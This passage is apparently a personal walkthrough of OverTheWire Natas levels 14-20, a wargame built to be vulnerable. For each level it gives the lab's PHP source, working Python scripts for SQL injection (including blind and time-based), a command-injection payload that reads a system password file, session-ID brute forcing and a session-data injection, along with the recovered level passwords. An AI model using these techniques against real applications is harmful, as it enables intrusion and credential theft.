<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try `natas15" --` and no password:

Error:

> Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24

Looking better at the code, we need to comment out the PHP code, not the SQL query: try `natas15" #`.
This works:

> Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

## Natas 15

### Credentials

Username: natas15

Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

URL: http://natas15.natas.labs.overthewire.org

### Message

Username: ...

Check existence

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to brute-force the password using the following Python script:

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
natas15_username = "natas15"
natas15_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

success_phrase = "This user exists."

characters = "".join([string.ascii_letters, string.digits])


def find_password_letters():
    letters = []
    print("Finding password letters...")
    for c in characters:
        uri = url + '?username=natas16"+and+password+LIKE+BINARY+"%' + c + '%&debug'
        r = requests.get(uri, auth=(natas15_username, natas15_password))
        if success_phrase in r.text:
            letters.append(c)
    print("All password letters found!")
    return letters


def brute_force_password(password_letters):
    print("Brute-forcing password...")
    password = ""
    for _ in range(1, 64):
        for c in password_letters:
            test = password + c
            uri = url + '?username=natas16"+and+password+LIKE+BINARY+"' + test + '%&debug'
            resp = requests.get(uri, auth=(natas15_username, natas15_password))
            if success_phrase in resp.text:
                password += c
    print("Brute-forcing password complete!")
    return password


if __name__ == "__main__":
    letters = find_password_letters()
    password = brute_force_password(letters)
    print("Password: ", password)
```

Execution:

```shell
$ python natas15.py
Finding password letters...
All password letters found!
Brute-forcing password...
Brute-forcing password complete!
Password:  hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

## Natas 16

### Credentials

Username: natas16

Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

URL: http://natas16.natas.labs.overthewire.org

### Message

For security reasons, we now filter even more on certain characters

Find words containing: ... **Search**

Output: ...

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to brute-force as before:

```python
import requests
import string

letters = "".join([string.ascii_letters, string.digits])
url = "http://natas16.natas.labs.overthewire.org"
natas16_username = "natas16"
natas16_password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"


def brute_force_password():
    password = ""
    while len(password) < 32:
        for c in letters:
            test = '$(grep -E ^' + password + c + \
                '.* /etc/natas_webpass/natas17)'
            uri = url + '?needle=' + test + '&submit=Search'
            resp = requests.get(uri, auth=(natas16_username, natas16_password))
            if len(resp.text) == 1105:
                password += c
                break
    return password


if __name__ == "__main__":
    password = brute_force_password()
    print(password)
```

Execution:

```bash
$ python natas16.py
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Natas 17

### Credentials

Username: natas17

Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

URL: http://natas17.natas.labs.overthewire.org

### Message

Requires a username in an input field.

### Solution

The source code (linked):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Use a Python script:

```python
import requests
import string

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
natas17_username = "natas17"
natas17_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

chars = string.digits + string.ascii_letters


def find_letter(letter: str, password: str) -> str:
    body = f"username=natas18\" and password like binary '{password + letter}%' and sleep(5) #"
    resp = requests.post(url, auth=(
        natas17_username, natas17_password), headers=headers, data=body)
    if resp.elapsed.total_seconds() > 3:
        return letter
    return None


def find_password() -> str:
    password = ""
    while len(password) < 32:
        for letter in chars:
            next_letter = find_letter(letter, password)
            if next_letter is not None:
                password += letter
    return password


if __name__ == "__main__":
    password = find_password()
    print(f"Found password: {password}")
```

This gives:

```bash
$ python natas17.py
Found password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Natas 18

### Credentials

Username: natas18

Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

URL: http://natas18.natas.labs.overthewire.org

### Message

Requires the admin credentials: username and password.

### Solution

Source code provided:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part only:

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}


$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

Python script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

count = 1
max_count = 640

url = "http://natas18.natas.labs.overthewire.org/index.php?debug"


def check_session_id(count: int) -> None:
    cookie = "PHPSESSID=" + str(count)
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers,
                            auth=basic_auth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)


if __name__ == '__main__':
    for count in range(max_count + 1):
        check_session_id(count)
```

Result:

```bash
$ python experiment.py
Traceback (most recent call last):
  File "/Users/elia/Source/MyStuff/elman23.github.io/OverTheWire/natas/experiment.py", line 24, in <module>
    check_session_id(count)
  File "/Users/elia/Source/MyStuff/elman23.github.io/OverTheWire/natas/experiment.py", line 13, in check_session_id
    cookie = "PHPSESSID=" + count
TypeError: can only concatenate str (not "int") to str
╭─elia@pearl ~/Source/MyStuff/elman23.github.io/OverTheWire/natas ‹main●›
╰─$ python experiment.py                                                    1 ↵
PHPSESSID=119
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Natas 19

### Credentials

Username: natas19

Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

URL: http://natas19.natas.labs.overthewire.org

### Message

This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.

The website then requests a username and a password.

### Solution

We explore the request sending obviously wrong credentials:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')


url = "http://natas19.natas.labs.overthewire.org/index.php"


def check_session_id(session_id: str) -> str:
    cookie = "PHPSESSID=" + session_id
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"username": "asd", "password": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = check_session_id("3338302d617364")
    print(text)
```

Which gives us:

```bash
$ python natas19.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.</div>
</body>
</html>
```

The value of the cookie, `3338302d617364`, is copied from the same request sent through the browser.

We use CyberChef to decode the cookie: `3338302d617364` is simply hex encoding of `380-asd`.

Encoding and decoding from hexadecimal in Python can be done using `base64`:

```python
>>> import base64
>>> base64.b16encode(b"380-asd").lower()
b'3338302d617364'
```

We write the script:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

count = 1
max_count = 640
url = "http://natas19.natas.labs.overthewire.org/index.php"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def check_session_id(count: int, username: str) -> str:
    to_encode = str(count) + "-" + username
    cookie = "PHPSESSID=" + encode_cookie(to_encode)
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"username": "asd", "password": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    for count in range(max_count + 1):
        text = check_session_id(count, "admin")
        if "You are logged in as a regular user." not in text:
            print(text)
            break
```

The execution gives:

```bash
$ python natas19.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
```

## Natas 20

### Credentials

Username: natas20

Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

URL: http://natas20.natas.labs.overthewire.org

### Message

You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

Requires a name.

### Solution

We are given the source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?php

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}


/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP part:

```php
<?php

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}


/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

There is a `debug` funciton, which supposedly gives the functionality of debug messages when passed `?debug` in the request.

In fact, calling `http://natas20.natas.labs.overthewire.org/index.php?debug` and passing as name `asd` with the script

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def send_request() -> str:
    cookie = "PHPSESSID=" + "brafbmkkbb2tmhhrn5m68r36n2"
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'Cookie': cookie}
    body = {"name": "asd"}
    response = requests.post(url, headers=headers,
                             auth=basic_auth, json=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request()
    print(text)
```

we get the message:

```bash
$ python  natas20.py
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
DEBUG: MYREAD brafbmkkbb2tmhhrn5m68r36n2<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
DEBUG: MYWRITE brafbmkkbb2tmhhrn5m68r36n2 <br>DEBUG: Saving in /var/lib/php/sessions/mysess_brafbmkkbb2tmhhrn5m68r36n2<br>
```

The functions `myread` and `mywrite` need to be read carefully.

The file is created in a first call, then read in the second. So we shall call the API twice, as in the following script:

```python
import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"


def send_request() -> str:
    cookie = "PHPSESSID=" + "admin"
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
               'Cookie': cookie}
    body = "name=test\nadmin 1"
    response = requests.post(url, headers=headers,
                             auth=basic_auth, data=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request()
    text = send_request()
    print(text)
```

This is equivalent to sending twice (eg. with Burp) the following POST request:

```
POST /index.php?debug HTTP/1.1
Host: natas20.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://natas20.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMDpwNW1DdlA3R1MySzZCbXQzZ3FoTTJGYzFBNVQ4TVZ5dw==
Connection: keep-alive
Referer: http://natas20.natas.labs.overthewire.org/index.php
Cookie: PHPSESSID=969hrbu40iem1f32c61essr8ev
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

name=test
admin 1
```

The second call gives the response:

```
HTTP/1.1 200 OK
Date: Sun, 20 Oct 2024 14:04:36 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
